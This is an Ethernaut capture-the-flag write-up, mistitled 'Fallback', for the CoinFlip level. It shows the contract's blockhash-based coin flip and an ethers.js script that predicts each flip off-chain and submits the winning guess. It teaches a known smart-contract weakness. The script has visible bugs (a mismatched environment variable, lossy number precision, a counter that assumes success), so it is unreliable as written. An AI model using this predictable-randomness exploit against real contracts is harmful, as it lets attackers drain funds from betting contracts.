## Fallback Level Outline

**Difficulty : 3/10**

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

## Solution
Because the flip is calculated onchain using the previous blockhash, we can predict what the outcome will be by simulating the coinflip offchain and then submitting the right predition.

This level does not use foundry as it will be solved using a simple [ethersjs](https://docs.ethers.io/v5/) script. **Feel free to contribute if you have a solution using only foundry

### Walkthrough

1. set up a node project
```console
npm init
```

2. install the dotenv and ethersjs package 
```console
npm install ethers
npm install dotenv
```

3. create a `.env` file with the following variables
- `PRIVATE_KEY`
- `NODE_URL`
 
```console
touch .env
ECHO PRIVATE_KEY=<your-private-key-here> >> .env
ECHO NODE_URL=<your-node-url-here> >> .env
```
4. create a `src/coinFlip.js` file to hold our script

```javascript
const ethers = require('ethers');
require('dotenv').config();

const NODE_URL = process.env.RINKERBY;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const LEVEL_ADDRESS = process.env.LEVEL_ADDRESS;

const provider = new ethers.providers.JsonRpcProvider(NODE_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY);
const signer = wallet.connect(provider);

const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

const coinFlipContract = new ethers.Contract(
  LEVEL_ADDRESS,
  ["function flip(bool _guess) public returns (bool)"],
  signer
)

let correctFlips = 0;

// everytime there is a new block lets get it's number
provider.on('block', async (blockNum) => {
  console.log("blockNum : ", blockNum);
  let blockData = await provider.getBlock(blockNum);
  let blockHash = blockData.hash;
  let blockValue = parseInt(blockHash, 16);
  let coinFlip = Math.floor(blockValue / FACTOR);
  let side = coinFlip == 1 ? true : false;

  const tx = await coinFlipContract.flip(side);
  const promise = tx.wait();
  const receipt = await promise;

  correctFlips++;
  console.log(correctFlips);
})

```

5. run the script that we just created
```
node src/coinFlip.js
```
